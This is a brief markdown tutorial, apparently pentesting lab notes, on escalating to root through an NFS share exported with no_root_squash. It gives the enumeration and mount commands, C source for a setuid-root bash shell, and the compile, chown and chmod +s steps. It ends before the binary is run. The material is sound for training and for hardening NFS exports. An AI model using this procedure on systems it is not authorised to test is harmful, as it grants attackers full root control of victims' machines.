# 🔐 Privilege Escalation: Network File Sharing (NFS)

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

---

to this file in victim machine use :
```bash
cat /etc/exports
```

![img](screenshots/NFS/know_nfs_victim.png)

---

to know from your machine use :
```bash
showmount -e <IP_Target>
```

![img](screenshots/NFS/know_nfs_my_machine.png)

---
it must include " no_root_squash " to can exploit it

---

to connect my file with this file we use :

```bash
sudo mount -o rw <IP_Target>:<Path_of_NFS> <My_Path>
```
example :

```bash
sudo mount -o rw 10.114.144.62:/tmp /tmp/nfs_mount
```

![img](screenshots/NFS/make_mount.png)

---

then create file.c and write exploit code 

![img](screenshots/NFS/nano_nfs.png)

```bash
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

int main()
{
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
}
```

![img](screenshots/NFS/exploit_code.png)

compile it by 

```bash
gcc nfs.c -o nfs -static
```
![img](screenshots/NFS/compile_it.png)

change owner to run as root ,and permission

```bash
sudo chown root:root /tmp/nfs_mount/nfs
sudo chmod +s /tmp/nfs_mount/nfs
```

 ![img](screenshots/NFS/change_own_perm.png)

---

